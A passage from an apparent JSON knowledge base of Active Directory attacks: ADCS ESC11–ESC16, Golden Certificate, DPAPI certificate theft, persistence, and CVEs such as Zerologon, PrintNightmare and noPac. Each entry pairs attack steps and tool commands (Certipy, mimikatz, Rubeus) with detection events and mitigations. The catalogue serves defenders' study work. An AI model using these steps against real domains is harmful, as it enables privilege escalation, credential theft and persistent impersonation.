CertificateMappingMethods allows UPN mapping (Schannel), certificate UPN/mail attributes are weakly mapped, allowing impersonation of another user via UPN rewrite.","how":"Prerequisites (Case1): StrongCertificateBindingEnforcement=0. Rewrite the victim account's UPN to administrator → enroll any Client Auth template → revert the UPN → authenticate as admin with the certificate. Prerequisites (Case2): Schannel CertificateMappingMethods 0x4 (UPN) enabled. Blank a machine account's UPN and rewrite it to DC$@... to impersonate the DC via Schannel (LDAPS etc.).","tools":"Certipy (account update, req, auth -ldap-shell), PowerView","detect":"Audit the registry values of StrongCertificateBindingEnforcement / Schannel CertificateMappingMethods. Monitor temporary UPN attribute rewrites (5136) and Schannel/Kerberos authentication using weak mappings.","events":"5136, 4768, 4769, 4624(Schannel)","mitigate":"Set StrongCertificateBindingEnforcement=2 (enforce). Remove UPN (0x4) from Schannel CertificateMappingMethods and allow only strong mapping (SKI/Issuer+Serial). Apply KB5014754-compliant patches and restrict UPN-rewrite rights."},{"name":"ESC11 - NTLM Relay to ICertPassage RPC (IF_ENFORCEENCRYPTICERTREQUEST)","aka":"RPC relay to CA","phase":"privesc","group":"ADCS (Certificate Services)","mitre":"T1557, T1649","cve":"","sev":"High","summary":"When the CA's ICertPassage (MS-ICPR) RPC interface does not enforce packet privacy (encryption), relay NTLM authentication over RPC to have a certificate issued. An RPC variant of ESC8 that needs no Web Enrollment.","how":"Prerequisites: IF_ENFORCEENCRYPTICERTREQUEST not set in the CA registry InterfaceFlags. Start a relay server targeting the ICPR RPC endpoint (-rpc) with a patched ntlmrelayx/Certipy, coerce victim account authentication, and relay over RPC to have that certificate issued for use in authentication.","tools":"Certipy relay -target rpc://<ca>, ntlmrelayx(-rpc ICPR対応版), PetitPotam/Coercer","detect":"Detect certificate requests via RPC (ICPR) through 4886/4887 and mismatches between the requester and the network path. Correlate coercion events with CA issuance.","events":"4886, 4887, 4768, 5145","mitigate":"Enable IF_ENFORCEENCRYPTICERTREQUEST on the CA (`certutil -setreg CA\\InterfaceFlags +IF_ENFORCEENCRYPTICERTREQUEST`) to enforce RPC encryption. Apply domain-wide NTLM restrictions and coercion countermeasures (RPC filters)."},{"name":"ESC12 - Shell Access to ADCS CA with YubiHSM","aka":"HSM static PIN abuse","phase":"privesc","group":"ADCS (Certificate Services)","mitre":"T1649, T1552","cve":"","sev":"High","summary":"Even when the CA private key is stored in an HSM such as a YubiHSM, if a static PIN is stored in the registry and a shell can be obtained on the CA, the CA private key can be used via the HSM to forge a Golden Certificate.","how":"Prerequisites: administrator shell on the CA server, and the HSM auth key (PIN) stored in cleartext in the registry (e.g., HKLM\\SOFTWARE\\Yubico\\YubiHSM). Read the PIN, sign using the CA private key via yubihsm-connector, and forge a certificate for any user (Golden Certificate) for long-term impersonation/persistence.","tools":"reg query, yubihsm-shell/connector, Certipy forge, ForgeCert","detect":"Monitor interactive logons to the CA server (4624 type2/10) and reads of sensitive registry keys. Detect unexpected signing activity with the CA key and long-lived certificate authentication derived from Golden Certificates (4768).","events":"4624, 4672, 4768","mitigate":"Strictly isolate the CA server as Tier0 and minimize shell access. Do not store the HSM PIN in cleartext in the registry; manage it securely and audit HSM operations. Restrict privileged access to the CA server to PAW-only."},{"name":"ESC13 - Issuance Policy OID Linked to AD Group (OID Group Link)","aka":"msDS-OIDToGroupLink abuse","phase":"privesc","group":"ADCS (Certificate Services)","mitre":"T1649","cve":"","sev":"High","summary":"When a certificate template's issuance policy OID is linked to an AD group via msDS-OIDToGroupLink, authenticating with a certificate issued from that template grants membership in the linked group, effectively escalating into a privileged group.","how":"Prereq: an Issuance Policy OID is linked to a privileged group (e.g. a high-privilege group) and the template carrying that OID has low-privilege Enroll rights. Use certipy find to identify ESC13, enroll in the template, then certipy auth with the obtained certificate; the linked group SID is placed in the Kerberos token, escalating privileges.","tools":"Certipy (find/req/auth), PowerView(msDS-OIDToGroupLink列挙)","detect":"Audit msDS-OIDToGroupLink settings on OID container objects (msPKI-Enterprise-Oid). Correlate template issuance (4887) with subsequent logons carrying privileged-group membership.","events":"4887, 4768, 4769, 5136","mitigate":"Inventory group links via msDS-OIDToGroupLink and remove OID links to privileged groups. Where a link is required, tighten Enroll rights on the target template and require manager approval."},{"name":"ESC14 - Weak Explicit Certificate Mapping (altSecurityIdentities)","aka":"explicit certificate mapping abuse","phase":"privesc","group":"ADCS (Certificate Services)","mitre":"T1649, T1098","cve":"","sev":"High","summary":"With write access to a target account's altSecurityIdentities attribute, an attacker can explicitly map an attacker-controlled certificate to the account and impersonate it. Weak mapping formats (issuer name, UPN, etc.) allow impersonation even with a third-party certificate.","how":"Prereq: Write on the victim account's altSecurityIdentities. Add the Issuer+Subject or a weak identifier of a certificate you issue/hold to the target's altSecurityIdentities, then authenticate as the target via PKINIT/Schannel with that certificate. Even with strong mappings (X509IssuerSerialNumber, etc.), write access lets you bind any attacker certificate.","tools":"Certipy, PowerView Set-ADObject(altSecurityIdentities), Rubeus","detect":"Monitor altSecurityIdentities changes (5136) as a high-signal event. Especially detect explicit mapping additions to admin and service accounts.","events":"5136, 4768, 4769, 4624","mitigate":"Strictly restrict write access to altSecurityIdentities and forbid weak mapping formats (issuer-only, UPN, etc.), allowing only strong mappings (SKI/Issuer+Serial+SubjectKeyId). Set audit alerts on attribute changes."},{"name":"ESC15 - EKUwu (Application Policies in V1 Templates)","aka":"EKUwu","phase":"privesc","group":"ADCS (Certificate Services)","mitre":"T1649","cve":"CVE-2024-49019","sev":"Critical","summary":"In schema version 1 (V1) templates, the CSR's Application Policies extension can inject arbitrary EKUs (Client Authentication, etc.) or enrollment agent rights, allowing forgery of authentication certificates from Enrollee-supplies-subject V1 templates (e.g. WebServer).","how":"Prereq: Enroll rights on a V1 template (schemaVersion=1, e.g. WebServer). Inject an Application Policies extension into the CSR with certipy req -template WebServer -application-policies '1.3.6.1.5.5.7.3.2' (Client Auth) or '...20.2.1' (Enrollment Agent) to obtain a SAN-impersonation certificate or an Enrollment Agent certificate, used for authentication or proxy enrollment.","tools":"Certipy (req -application-policies), 手製CSR(openssl)","detect":"Detect issuance (4887) from V1 templates producing certificates whose Application Policies/EKU differ from the template's intended EKU. A Client Auth certificate coming from a server template like WebServer is anomalous.","events":"4886, 4887, 4768","mitigate":"Apply the CVE-2024-49019 patch (Nov 2024). Retire V1 templates and migrate to V2+, and remove Enroll rights on Enrollee-supplies-subject V1 templates. Verify the post-patch CA configuration disables Application Policies injection."},{"name":"ESC16 - Security Extension Disabled Globally on CA","aka":"SID security extension disabled CA-wide","phase":"privesc","group":"ADCS (Certificate Services)","mitre":"T1649","cve":"","sev":"High","summary":"When szOID_NTDS_CA_SECURITY_EXT (SID extension) is disabled CA-wide via the CA's DisableExtensionList, certificates from all templates lack the SID binding, enabling broad ESC9-like UPN-rewrite impersonation.","how":"Prereq: szOID_NTDS_CA_SECURITY_EXT (1.3.6.1.4.1.311.25.2) is registered in DisableExtensionList in the CA registry policy and disabled. Rewrite the victim account's UPN to administrator, enroll in any authentication template, revert the UPN, then authenticate as administrator with the SID-extension-less certificate. Broader than ESC9 because it affects the entire CA.","tools":"Certipy (find でESC16検出, account update, req, auth)","detect":"Audit whether the SID security extension OID is present in the CA registry's DisableExtensionList. Monitor authentication with SID-extension-less certificates and UPN rewrites (5136).","events":"5136, 4886, 4887, 4768","mitigate":"Remove szOID_NTDS_CA_SECURITY_EXT from the CA's DisableExtensionList so the SID security extension is issued for all templates. Apply KB5014754 enforcement mode and baseline-monitor the CA registry configuration."},{"name":"Certifried - Machine Account dNSHostName Spoofing","aka":"Certifried","phase":"privesc","group":"ADCS (Certificate Services)","mitre":"T1649, T1078","cve":"CVE-2022-26923","sev":"Critical","summary":"Using the default Machine template, rewriting a computer account's dNSHostName to an existing DC's FQDN and enrolling causes the CA to resolve the name as the DC and issue a certificate that authenticates as DC$.","how":"Prereq: pre-patch (before May 2022) environment, MachineAccountQuota>0 or control of an existing machine account. Use certipy account create/update to set a new/existing machine's dNSHostName to DC.domain.local (to bypass the SPN uniqueness check, first delete the conflicting SPN on the attacker-controlled machine account; no change to the DC object is needed and is normally out of scope), enroll in the Machine template to obtain a certificate with the DC name, then certipy auth to get a TGT as DC$, leading to DCSync.","tools":"Certipy (account create/update, req, auth), addcomputer.py, Powermad","detect":"Monitor computer-account dNSHostName changes (5136), especially collisions with an existing DC name. Correlate certificate issuance (4887) and PKINIT (4768) under pre-patch behavior that does not validate the SID security extension.","events":"5136, 4741/4742(コンピュータ作成/変更), 4886, 4887, 4768","mitigate":"Apply the CVE-2022-26923 patch (KB5014754) to enforce the SID security extension and strong mapping. Set MachineAccountQuota to 0, restrict modification of dNSHostName/servicePrincipalName, and audit computer-account creation."},{"name":"Golden Certificate (CA Private Key Theft / PERSIST3)","aka":"Golden Certificate, ForgeCert","phase":"privesc","group":"ADCS (Certificate Services)","mitre":"T1649, T1552.004, T1550","cve":"","sev":"Critical","summary":"Steal the CA root private key (+certificate) from the CA server and forge client authentication certificates for any user offline, without limit. Unaffected by CRL/revocation, it is the ultimate ADCS persistence with long-term durability.","how":"Prereq: administrator rights on the CA server. Export the CA private key with certipy ca -backup or via DPAPI/CAPI (mimikatz crypto::certificates /export) (for HSMs, obtain the PIN via ESC12), forge an arbitrary user certificate with ForgeCert/certipy forge -ca-pfx ca.pfx -upn administrator@domain.local, then authenticate with certipy auth. Forgery continues even after DC rebuild as long as the CA key is unchanged.","tools":"Certipy (ca -backup / forge), ForgeCert, mimikatz (crypto::certificates /export, lsadump)","detect":"Monitor private-key export, DPAPI/CAPI access, and interactive logons (4624/4672) on the CA server. The strongest signal is a forged certificate authenticating (4768) with no corresponding record in the CA issuance DB (4887); correlate PKINIT with serials absent from the issuance DB.","events":"4768, 4624, 4672, (CA発行DBとの突合)","mitigate":"Store the CA private key in an HSM as non-exportable. Isolate the CA server in Tier 0 and minimize shell access. Since compromise requires CA key rotation (CA rebuild), design a two-tier PKI. Build detection for authentication with serials absent from the issuance DB."},{"name":"THEFT1 - Certificate Export via CryptoAPI/CNG (Memory)","aka":"Mimikatz crypto::certificates","phase":"privesc","group":"ADCS (Certificate Services)","mitre":"T1552.004, T1555","cve":"","sev":"High","summary":"On a logged-on host, export user and machine certificates and private keys from the CryptoAPI (CAPI)/CNG key stores via memory (bypassing the non-exportable flag).","how":"Prereq: local administrator/SYSTEM on the target host. Use mimikatz crypto::capi / crypto::cng to patch the key providers and extract even non-exportable private keys, then crypto::certificates /export /systemstore:local_machine to produce a PFX. Use the obtained certificate to impersonate other users/machines.","tools":"mimikatz (crypto::capi, crypto::cng, crypto::certificates /export), SharpDPAPI certificates","detect":"Monitor handle access to LSASS/CNG and patching of CAPI/CNG providers (EDR memory-tampering detection). Detect bulk exports from the certificate store and execution of known attack tools.","events":"4656/4663(証明書ストア/鍵ファイルアクセス), EDRテレメトリ","mitigate":"Make private keys non-exportable and hardware-protected (TPM/smart card). Minimize privileged access and use EDR to detect/block credential dumping and provider tampering. Keep critical certificates short-lived."},{"name":"THEFT2 - User Certificate Theft via DPAPI","aka":"DPAPI masterkey decryption (user)","phase":"privesc","group":"ADCS (Certificate Services)","mitre":"T1552.004, T1555.004","cve":"","sev":"High","summary":"Decrypt a user's DPAPI-protected private keys (under %APPDATA%\\Microsoft\\Crypto) and masterkeys to steal the user certificate's private key.","how":"Prereq: target user context or a means to decrypt their DPAPI masterkey (user password/domain backup key). Use SharpDPAPI certificates /pvk or mimikatz dpapi::masterkey then dpapi::capi/cng to decrypt the encrypted keys under %APPDATA%\\Microsoft\\Crypto\\RSA(CNG), reconstruct the PFX, and use it for certificate authentication.","tools":"SharpDPAPI (certificates), mimikatz (dpapi::masterkey, dpapi::cng), Certipy (shadow/DPAPI関連)","detect":"Monitor anomalous access to %APPDATA%\\Microsoft\\Crypto and %APPDATA%\\Microsoft\\Protect (masterkeys). Detect attempts to obtain the domain DPAPI backup key (BackupKey) (4662 on Domain).","events":"4656/4663(Cryptoフォルダ), 4662(BackupKey), EDR","mitigate":"Hardware-protect private keys (TPM/smart card) and avoid plaintext DPAPI storage. Restrict and audit access to the DPAPI domain backup key to Tier 0. Use EDR to detect DPAPI abuse tools."},{"name":"THEFT3 - Machine Certificate Theft via DPAPI","aka":"DPAPI masterkey decryption (machine)","phase":"privesc","group":"ADCS (Certificate Services)","mitre":"T1552.004, T1555.004","cve":"","sev":"High","summary":"Decrypt machine-certificate private keys protected by machine DPAPI (SYSTEM) (under %ALLUSERSPROFILE%\\Microsoft\\Crypto, etc.) to steal the computer account's certificate.","how":"Prereq: SYSTEM/administrator on the target host. Use SharpDPAPI certificates /machine or mimikatz with the machine DPAPI masterkey (LSA secret DPAPI_SYSTEM) to decrypt the machine keys and produce a PFX, used for (certificate-based) computer-account authentication. High-value on a DC.","tools":"SharpDPAPI (certificates /machine), mimikatz (dpapi), Certipy","detect":"Monitor access to machine Crypto folders (%ProgramData%\\Microsoft\\Crypto\\Keys, etc.), LSA secrets access, and certificate export under SYSTEM.","events":"4656/4663, 4672, EDR","mitigate":"TPM-protect machine keys and minimize local administrator rights. Use EDR to detect LSA/DPAPI access. Keep certificates on high-value hosts such as DCs short-lived and strictly managed."},{"name":"THEFT4 - Finding Certificate Files on Disk","aka":"PFX/PEM file hunting","phase":"privesc","group":"ADCS (Certificate Services)","mitre":"T1552.004, T1083","cve":"","sev":"Medium","summary":"Search for and collect certificate files (.pfx/.p12/.pem/.key/.crt) stored in plaintext or with weak passwords on the filesystem to obtain private keys.","how":"Prereq: read access to the target host/shares. Sweep disks, file shares, backups, and scripts for .pfx/.p12/.pem/.key, etc., crack found PFX passwords (empty/dictionary/hash cracking with pfx2john), and use them for certificate authentication. SYSVOL, automation scripts, and developer PCs are prime targets.","tools":"Seatbelt, Snaffler, findstr/Get-ChildItem, pfx2john+john/hashcat, Certipy","detect":"Monitor bulk access to certificate files on file shares (5145), execution of hunting tools like Snaffler, and anomalous access to sensitive extensions.","events":"5145, 5140, 4663, EDR","mitigate":"Do not place private-key files in plaintext or on shares; protect with strong passphrases/secret management (Vault). Inventory SYSVOL and shares with DLP/auditing. Remove certificates from dev/ops scripts and keep them short-lived."},{"name":"THEFT5 - NTLM Credential Theft via PKINIT (UnPAC-the-hash)","aka":"UnPAC-the-hash","phase":"privesc","group":"ADCS (Certificate Services)","mitre":"T1550.003, T1558","cve":"","sev":"High","summary":"Use the PAC_CREDENTIAL_INFO (NTLM credentials) contained in a TGT obtained via PKINIT to recover the user's NTLM hash from a certificate. Even after the certificate is revoked/expired, the hash allows persistent authentication.","how":"Prereq: possession of the target user's authentication certificate (PKINIT-capable). Use Rubeus asktgt /getcredentials /certificate:user.pfx or certipy auth -pfx user.pfx to PKINIT and obtain a TGT, decrypt the PAC_CREDENTIAL_INFO in the response to extract the NTLM hash, then authenticate via PtH thereafter. Converting certificate to hash increases persistence.","tools":"Rubeus (asktgt /getcredentials), Certipy auth, gettgtpkinit.py+getnthash.py (PKINITtools)","detect":"Monitor correlation, under the same account, of certificate-based PKINIT authentication (4768 with the Certificate Information field) followed by NTLM authentication (4776/4624 type3). Detect unexpected combined PKINIT+NTLM use.","events":"4768(PKINIT), 4776, 4624","mitigate":"Minimize and shorten the lifetime of authentication certificates. On compromise, reset the password twice (to invalidate the NTLM hash). Implement KB5014754 strong mapping and PKINIT monitoring, and continuously revoke and inventory certificates."},{"name":"PERSIST1 - User Persistence via Certificate Enrollment","aka":"long-term user persistence via certificate","phase":"privesc","group":"ADCS (Certificate Services)","mitre":"T1649, T1550.003","cve":"","sev":"High","summary":"A persistence technique in which a legitimately long-validity client authentication certificate is enrolled with compromised user privileges, allowing continued certificate authentication even after a password change.","how":"Prereq: target user's Enroll rights. During compromise, enroll and store an authentication certificate for the user with certipy req / Certify request; even if the password is reset, continue obtaining TGTs and access via certipy auth for the certificate's validity period. Combine with UnPAC-the-hash (THEFT5) to ease re-entry.","tools":"Certipy, Certify, Rubeus","detect":"Monitor unexpected certificate enrollment by users (4886/4887), especially certificate authentication (4768) by the same account after incident response. Inventory issued certificates.","events":"4886, 4887, 4768","mitigate":"Revoke the compromised account's certificates as well and combine with a password reset. Shorten authentication-certificate validity and audit enrollment. Keep CRL/OCSP functional to ensure revocation."},{"name":"PERSIST2 - Machine Persistence via Certificate","aka":"machine persistence via certificate","phase":"privesc","group":"ADCS (Certificate Services)","mitre":"T1649, T1550.003","cve":"","sev":"High","summary":"Persistence in which a certificate for a compromised computer account (especially a DC) is enrolled and retained, allowing continued machine authentication even after machine-password rotation.","how":"Prereq: target machine account (or SYSTEM) privileges. Enroll and store the target machine's certificate via the Machine/DomainController template, then obtain the machine account's TGT via certipy auth thereafter. A DC$ certificate leads to DCSync; authentication remains possible for the certificate's validity even after the machine password auto-rotates.","tools":"Certipy, Certify, Rubeus","detect":"Monitor certificate enrollment by machine accounts (4887) and subsequent PKINIT (4768). Flag as anomalous machine-certificate acquisition, especially via non-DC$ paths.","events":"4886, 4887, 4768","mitigate":"Revoke the compromised machine's certificate and rebuild the machine account. Shorten machine-certificate template validity, audit enrollment, and rigorously operate revocation (CRL)."},{"name":"Zerologon","aka":"Netlogon EoP","phase":"privesc","group":"Critical CVEs","mitre":"T1068, T1210","cve":"CVE-2020-1472","sev":"Critical","summary":"Exploits a flaw in the Netlogon (MS-NRPC) crypto implementation to set the DC machine account password to empty, leading to full domain compromise.","how":"Abuses a flaw where MS-NRPC's AES-CFB8 accepts an all-zero IV. Sends an all-zero ClientCredential repeatedly to ComputeNetlogonCredential, succeeding on average after 256 attempts. Uses NetrServerPasswordSet2 to reset the DC$ password to empty, then runs DCSync via secretsdump in that state to steal KRBTGT and Domain Admin hashes. Requires only network reachability (445/TCP RPC) and no credentials. Note: after exploitation, the original password must be written back to AD/LSA or the DC becomes unable to authenticate.","tools":"CVE-2020-1472 PoC(SecuraBV zerologon_tester/exploit)、impacket secretsdump.py、mimikatz(lsadump::zerologon)、nccgroup dirkjanm系スクリプト","detect":"Monitor for a spike in authentication failures against a single machine account in a short window and consecutive NetrServerPasswordSet2 calls. Password change events (4742) for DC$ itself, or anonymous/empty-password Netlogon authentication against the DC, are anomaly signals. Correlate abnormal Netlogon RPC frequency in SIEM.","events":"4742(コンピュータアカウント変更), 4672, 5805, Netlogon 5827/5829/5830/5831, 4624(Logon Type 3)","mitigate":"Apply the August 2020 patch (mandatory) and enable the February 2021 Enforcement mode. Set the FullSecureChannelProtection registry value to 1 to reject vulnerable connections. Monitor DC events 5827/5829 to surface non-compliant devices."},{"name":"PrintNightmare (RCE)","aka":"Print Spooler RCE","phase":"privesc","group":"Critical CVEs","mitre":"T1068, T1210, T1547","cve":"CVE-2021-34527, CVE-2021-1675","sev":"Critical","summary":"Loads a malicious driver DLL as SYSTEM via Print Spooler's RpcAddPrinterDriverEx to achieve RCE / privilege escalation.","how":"Calls RpcAddPrinterDriverEx via MS-RPRN/MS-PAR to make the spooler load a malicious driver DLL from a UNC path (SMB share) and execute it as SYSTEM. An authenticated low-privilege domain user targeting the spooler on a DC gains domain privilege escalation. 1675 is the local privilege escalation aspect; 34527 is the remote code execution aspect. Loose Point and Print settings allow non-admins to succeed.","tools":"cube0x0 CVE-2021-1675.py、SharpPrintNightmare、Invoke-Nightmare、mimikatz(misc::printnightmare)、impacket","detect":"Monitor for spoolsv.exe spawning child processes or loading DLLs from non-standard paths via EDR/Sysmon (EventID 7 Image Load). External driver additions and UNC path references are logged in the PrintService Operational log. The spooler running on a DC at all is itself noteworthy.","events":"Microsoft-Windows-PrintService/Operational 316/808, Admin 808, 4697(サービスインストール), Sysmon 1/7/11, 4104","mitigate":"Apply the latest patch. Stop/disable the Print Spooler service on hosts that don't need it (e.g., DCs). Harden Point and Print via registry: set RestrictDriverInstallationToAdministrators to 1 and NoWarningNoElevationOnInstall to 0."},{"name":"noPac / sAMAccountName Spoofing","aka":"sam-the-admin, CVE-2021-42278+42287","phase":"privesc","group":"Critical CVEs","mitre":"T1558, T1078.002","cve":"CVE-2021-42278, CVE-2021-42287","sev":"Critical","summary":"Exploits weak machine account name validation to obtain a TGS impersonating a DC and escalate to Domain Admin-equivalent.","how":"Uses MachineAccountQuota to create a machine account, then renames its sAMAccountName to a DC name (with the trailing $ removed). Obtains a TGT with that account, then reverts the account name. During TGT validation the DC cannot find the account and falls back to DC$, allowing an S4U2self service ticket impersonating Domain Admin. Requires a low-privilege domain user and MAQ>0.","tools":"noPac.py(Ridter/Cube0x0)、sam_the_admin.py、impacket(getST/secretsdump)、Rubeus","detect":"Detect the sequence of machine account creation → rename → rename-back in a short window. Monitor for sAMAccountName changes matching an existing DC name and for missing trailing $. Mismatches between TGT/TGS requests under the same name are also indicators.","events":"4741(コンピュータ作成), 4781(アカウント名変更), 4768/4769(Kerberos), 4662","mitigate":"Apply the November 2021 patch to all DCs. Set ms-DS-MachineAccountQuota to 0 to prevent ordinary users from creating machine accounts. Monitor 4741/4781 to detect renames closely resembling DC names."},{"name":"MS14-068 Kerberos PAC Forgery","aka":"Kerberos Checksum Vulnerability","phase":"privesc","group":"Critical CVEs","mitre":"T1558, T1068","cve":"CVE-2014-6324","sev":"Critical","summary":"Exploits a PAC signature validation flaw in the TGT to escalate to domain admin using a forged PAC asserting arbitrary groups (Domain Admins).","how":"Exploits a flaw where the KDC accepts unkeyed/weak checksums such as MD5 for the PAC signature. With a low-privilege user's plaintext password or hash, generate a TGT carrying a forged PAC containing privileged SIDs (e.g., Domain Admins) to gain privileged access to any service. Requires only a single domain user's credentials.","tools":"pykek(ms14-068.py)、impacket goldenPac.py、mimikatz(kerberos::ptt)","detect":"Monitor for high-privilege access by accounts that should never have it, TGTs issued in a short window, and TGS requests from non-standard tools. Enable PAC validation and enforce integrity checks at the KDC. Lingering legacy-OS DCs are the greatest risk.","events":"4768, 4769, 4624, 4672","mitigate":"Apply MS14-068 (November 2014) to all DCs. Even a single unpatched DC compromises the whole domain, so full patch verification is essential. Also disable RC4 and enforce PAC validation."},{"name":"BadSuccessor (dMSA Abuse)","aka":"delegated Managed Service Account abuse","phase":"privesc","group":"Critical CVEs","mitre":"T1078, T1098, T1558","cve":"","sev":"Critical","summary":"Abuses the dMSA migration feature in Windows Server 2025 to obtain a PAC inheriting the privileges of an arbitrary privileged account, leading to domain compromise.","how":"A low-privilege user with object-creation rights over an OU (etc.) creates a new dMSA, sets msDS-ManagedAccountPrecededByLink to the target (e.g., Domain Admin) and msDS-DelegatedMSAState to 2. By faking a completed migration, the dMSA receives a PAC inheriting the target's full privileges, and can further compute the dMSA's password offline via the KDS root key to impersonate persistently. Requires only creation rights over an OU/container; no write access to existing accounts is needed.","tools":"SharpSuccessor、BadSuccessor PoC(Akamai/Yuval Gordon)、Rubeus、Certipy(補助)","detect":"Closely monitor creation of new dMSA objects and changes to the msDS-ManagedAccountPrecededByLink/msDS-DelegatedMSAState attributes. A link set to a privileged account such as Domain Admin is the decisive signal. Also monitor TGT/TGS requests by dMSAs.","events":"5137(オブジェクト作成), 5136(属性変更), 4662, 4769, 2946","mitigate":"Inventory and minimize Create Child rights (especially msDS-DelegatedManagedServiceAccount) on OUs/containers. Restrict dMSA creation to administrators only. Set alerts for changes to the relevant attributes, and tighten delegation ACLs when deploying Server 2025."},{"name":"AD DS Security Feature Bypass","aka":"Escalation via KeyCredentialLink/SD rewrite","phase":"privesc","group":"Critical CVEs","mitre":"T1556, T1098","cve":"CVE-2021-42291","sev":"High","summary":"A user with certain privileges can illicitly manipulate an object's security descriptor or credential attributes and abuse them for privileged authentication.","how":"An authenticated user with certain privileges abuses write access to a computer/user object's security descriptor or msDS-KeyCredentialLink to establish Shadow Credentials-style certificate-based privileged authentication. Used alongside the noPac/Certifried family as a lateral-movement foothold.","tools":"impacket、Whisker、pyWhisker、custom LDAPスクリプト","detect":"Monitor for unexpected writes to the msDS-KeyCredentialLink attribute and changes to object security descriptors (nTSecurityDescriptor). Writes to privileged objects by low-privilege accounts are an indicator.","events":"5136(ディレクトリオブジェクト変更), 4662, 4768","mitigate":"Apply the November 2021 patch. Audit and minimize write ACLs on msDS-KeyCredentialLink, and enforce strong certificate mapping when using ADCS."},{"name":"SMBGhost","aka":"CoronaBlue, SMBv3 Compression Overflow","phase":"privesc","group":"Critical CVEs","mitre":"T1210, T1068","cve":"CVE-2020-0796","sev":"Critical","summary":"Exploits an integer overflow in SMBv3.1.1 compression handling to achieve remote code execution / privilege escalation.","how":"Exploits an integer overflow in SMBv3.1.1's SMB2_COMPRESSION_TRANSFORM_HEADER handling. A malformed message with the compression flag set corrupts the target's kernel memory, achieving pre-auth RCE or local SYSTEM escalation. Requires 445/TCP reachability and is wormable. In AD environments it is used for initial intrusion and lateral movement to DCs and file servers.","tools":"SMBGhost PoC(chompie1337 等)、Metasploit(cve_2020_0796)、danigargu exploit","detect":"Detect anomalous packets containing SMB2 compression headers or abnormal traffic to port 445 via IDS/IPS. lsass/kernel crashes, blue screens, and EDR memory-corruption detections are indicators.","events":"ネットワークIDSシグネチャ, System(クラッシュ/Bugcheck 1001), EDRテレメトリ","mitigate":"Apply the March 2020 patch. As an interim measure, set the DisableCompression registry value to 1 to disable SMB compression. Block 445/TCP at the perimeter and between hosts to reduce SMBv3.1.1 exposure."},{"name":"Kerberos Bronze Bit","aka":"S4U2self constrained delegation bypass","phase":"privesc","group":"Critical CVEs","mitre":"T1558, T1550.003","cve":"CVE-2020-17049","sev":"High","summary":"Tampers with the ciphertext of a service ticket to bypass the forwardable flag and Protected Users restrictions and abuse constrained delegation.","how":"An attacker holding the hash of a service account with constrained delegation nullifies the flags (forwardable) of an S4U2self-issued ticket and the 'account is sensitive and cannot be delegated'/Protected Users restrictions via ciphertext tampering, accessing downstream services as the target user. Requires the service account's credentials.","tools":"Rubeus(s4u /force-forwardable)、impacket getST.py","detect":"Monitor for abnormal S4U2self/S4U2proxy chains and delegated access against accounts that should not be delegable. Impersonation of many targets from a single service is an indicator.","events":"4769, 4768, 4624","mitigate":"Apply the November 2020 patch and the 2021 enforcement mode. Place privileged accounts in the Protected Users group and set the 'Account is sensitive and cannot be delegated' flag on sensitive accounts. Minimize constrained delegation configuration."},{"name":"Kerberos RC4-MD4 Session Key Recovery","aka":"AS-REP without-preauth attack","phase":"privesc","group":"Critical CVEs","mitre":"T1558.004, T1110","cve":"CVE-2022-33679","sev":"Medium","summary":"Recovers the session key from a weak RC4-MD4 AS response for an account with pre-authentication disabled and steals the TGT.","how":"Targets accounts with Kerberos pre-authentication disabled, forcing an AS-REP containing known plaintext under RC4-MD4, and recovers the session key online by exploiting the stream cipher's weakness. This yields a TGT for impersonation. Succeeds even without credentials as long as a DoNotRequirePreauth account exists.","tools":"Project Zero PoC(rc4_md4)、Rubeus/impacket(補助)","detect":"Monitor AS-REQ/AS-REP using RC4 (etype 23/-133, etc.), especially numerous requests against pre-auth-disabled accounts. Use of legacy cipher suites is itself an indicator.","events":"4768(暗号化タイプRC4), 4771, 4625","mitigate":"Apply the September 2022 (9/13 Patch Tuesday) patch (default AES enforcement is in the 2022/11/8 and later updates). Require Kerberos pre-authentication on all accounts and eliminate the DoNotRequirePreauth setting. Disable RC4 and migrate to AES-only."},{"name":"EternalBlue","aka":"MS17-010, WannaCry/NotPetya propagation","phase":"privesc","group":"Critical CVEs","mitre":"T1210, T1570","cve":"CVE-2017-0144","sev":"Critical","summary":"A pre-auth RCE exploiting an SMBv1 buffer-handling flaw, heavily used for lateral movement and worm propagation within AD environments.","how":"Exploits a transaction-handling flaw in SMBv1, sending a crafted packet to 445/TCP to corrupt kernel memory and achieve pre-auth RCE. After planting the DoublePulsar implant, it auto-propagates to other hosts in the domain, serving as a foundation for ransomware/lateral movement. Requires SMBv1-enabled hosts.","tools":"Metasploit(ms17_010_eternalblue)、Fuzzbunch/DoublePulsar、AutoBlue","detect":"Monitor SMBv1 traffic, abnormal scans/connections to port 445, and DoublePulsar's SMB echo responses. A rapid surge in 445 connections between hosts signals worming.","events":"System(SMBv1使用ログ), ネットワークIDSシグネチャ, 5140/5145","mitigate":"Apply MS17-010 (March 2017). Fully disable SMBv1 and block 445/135-139 at the perimeter and between segments. Suppress lateral movement with network segmentation."},{"name":"BlueKeep","aka":"RDP Pre-Auth RCE","phase":"privesc","group":"Critical CVEs","mitre":"T1210, T1021.001","cve":"CVE-2019-0708","sev":"Critical","summary":"A pre-auth RCE exploiting a use-after-free flaw in RDP (Terminal Services), used for initial intrusion into AD endpoints/servers.","how":"Exploits a Use-After-Free flaw in the RDP virtual channel MS_T120, sending a crafted channel request to 3389/TCP to execute code in kernel space. Pre-auth and wormable, targeting legacy OSes (Win7/2008) without NLA enabled. After intrusion it becomes a foothold for AD lateral movement.","tools":"Metasploit(cve_2019_0708_bluekeep_rce)、各種PoC","detect":"Monitor for abnormal connections to port 3389, use of the MS_T120 channel, and RDP service crashes/restarts. Scanning of externally exposed RDP is a precursor.","events":"System(TermDD/RDPクラッシュ), 4625, ネットワークIDS","mitigate":"Apply the May 2019 patch. Enable NLA (Network Level Authentication) and place RDP behind a VPN/jump host. Eliminate unnecessary 3389 exposure and retire legacy OSes."},{"name":"LocalPotato","aka":"NTLM Local EoP (SMB-to-self)","phase":"privesc","group":"Critical CVEs","mitre":"T1557.001, T1134","cve":"CVE-2023-21746","sev":"High","summary":"Reflects local NTLM authentication to SMB and abuses arbitrary file writes (etc.) to escalate to SYSTEM.","how":"Reflects locally occurring NTLM authentication to the same host's SMB server, and via cross-protocol abuse of the authentication challenge performs arbitrary file writes as a privileged process to escalate to SYSTEM. Requires local low-privilege execution rights, leading to privilege escalation and DLL hijacking on AD endpoints.","tools":"LocalPotato PoC、各種Potato系(RoguePotato/JuicyPotato亜種)","detect":"Monitor for local SMB loopback authentication and abnormal file writes by privileged processes via COM/RPC. Unexpected writes to system32 (etc.) are 